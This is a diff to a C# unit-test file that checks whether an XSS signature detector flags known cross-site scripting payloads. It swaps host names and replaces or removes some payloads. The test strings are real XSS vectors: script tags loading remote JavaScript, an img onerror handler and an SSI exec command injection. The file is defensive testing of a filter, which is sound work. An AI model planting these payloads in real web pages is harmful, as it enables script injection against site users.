@@ -598,7 +598,7 @@ namespace InjectionEater.t
         [Test]
         public void XSSinject_siganture_test_xss85_founded()
         {
-            string sql = @"<SCRIPT SRC=//ha.ckers.org/.j>";
+            string sql = @"<SCRIPT SRC=//website.com/.j>";
             Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss85 fail");
         }
 
@@ -752,7 +752,7 @@ namespace InjectionEater.t
         [Test]
         public void XSSinject_siganture_test_xss107_founded()
         {
-            string sql = @"exp/*<A STYLE='no\xss:noxss('*//*');xss:ex/*XSS*//*/*/pression(alert('XSS'))'>";
+            string sql = @"<img/src=`` onerror=this.onerror=confirm(1)";
             Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss107 fail");
         }
 
@@ -801,7 +801,7 @@ namespace InjectionEater.t
         [Test]
         public void XSSinject_siganture_test_xss114_founded()
         {
-            string sql = @"¼script¾alert(¢XSS¢)¼/script¾";
+            string sql = @"<sVg><scRipt >alert&lpar;1&rpar; {Opera}";
             Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss114 fail");
         }
 
@@ -899,7 +899,7 @@ namespace InjectionEater.t
         [Test]
         public void XSSinject_siganture_test_xss128_founded()
         {
-            string sql = @"<OBJECT TYPE='text/x-scriptlet' DATA='http://ha.ckers.org/scriptlet.html'></OBJECT>";
+            string sql = @"<OBJECT TYPE='text/x-scriptlet' DATA='http://website.com/scriptlet.html'></OBJECT>";
             Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss128 fail");
         }
 
@@ -920,7 +920,7 @@ namespace InjectionEater.t
         [Test]
         public void XSSinject_siganture_test_xss131_founded()
         {
-            string sql = @"<!--#exec cmd='/bin/echo '<SCR''--><!--#exec cmd='/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>''-->";
+            string sql = @"<!--#exec cmd='/bin/echo '<SCR''--><!--#exec cmd='/bin/echo 'IPT SRC=http://website.com/xss.js></SCRIPT>''-->";
             Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss131 fail");
         }
 
@@ -1069,20 +1069,6 @@ namespace InjectionEater.t
         {
             string sql = @"<input/onmouseover='javaSCRIPT&colon;confirm&lpar;1&rpar;'";
             Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss152 fail");
-        }
-
-        [Test]
-        public void XSSinject_siganture_test_xss153_founded()
-        {
-            string sql = @"<sVg><scRipt >alert&lpar;1&rpar; {Opera}";
-            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss153 fail");
-        }
-
-        [Test]
-        public void XSSinject_siganture_test_xss154_founded()
-        {
-            string sql = @"<img/src=`` onerror=this.onerror=confirm(1)";
-            Assert.That(!String.IsNullOrEmpty(XSSsignatures.Eat(sql)), "xss154 fail");
         }
     }
 }
